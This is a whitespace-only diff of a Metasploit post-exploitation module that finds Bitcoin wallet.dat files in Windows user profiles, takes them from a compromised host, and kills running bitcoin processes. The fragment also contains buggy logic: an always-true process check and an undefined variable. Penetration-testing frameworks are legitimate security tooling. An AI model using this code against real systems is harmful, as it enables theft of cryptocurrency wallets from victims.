@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Post
       'Name'          => 'Windows Gather Bitcoin Wallet',
       'Description'   => %q{
         This module downloads any Bitcoin Wallet files from the target
-				system.
+        system.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'illwill <illwill[at]illmob.org>'],
@@ -32,13 +32,13 @@ class Metasploit3 < Msf::Post
     grab_user_profiles().each do |user|
       next unless user['AppData']
       bitcoin_wallet_path = user['AppData'] + "\\Bitcoin\\wallet.dat"
-			next unless file?(bitcoin_wallet_path)
-			jack_bitcoin_wallet(bitcoin_wallet_path)
+      next unless file?(bitcoin_wallet_path)
+      jack_bitcoin_wallet(bitcoin_wallet_path)
     end
   end
 
   def jack_bitcoin_wallet(wallet_path)
-		data = ""
+    data = ""
     print_status("Wallet found at #{wallet_path}")
     print_status("Jackin' their wallet...")
 
@@ -68,8 +68,8 @@ class Metasploit3 < Msf::Post
 
   def kill_bitcoin
     client.sys.process.get_processes().each do |process|
-			pname = process['name'].downcase
-			if pname == "bitcoin.exe" || "bitcoind.exe"
+      pname = process['name'].downcase
+      if pname == "bitcoin.exe" || "bitcoind.exe"
         print_status("#{process['name']} Process Found...")
         print_status("Killing Process ID #{process['pid']}...")
         session.sys.process.kill(x['pid']) rescue nil
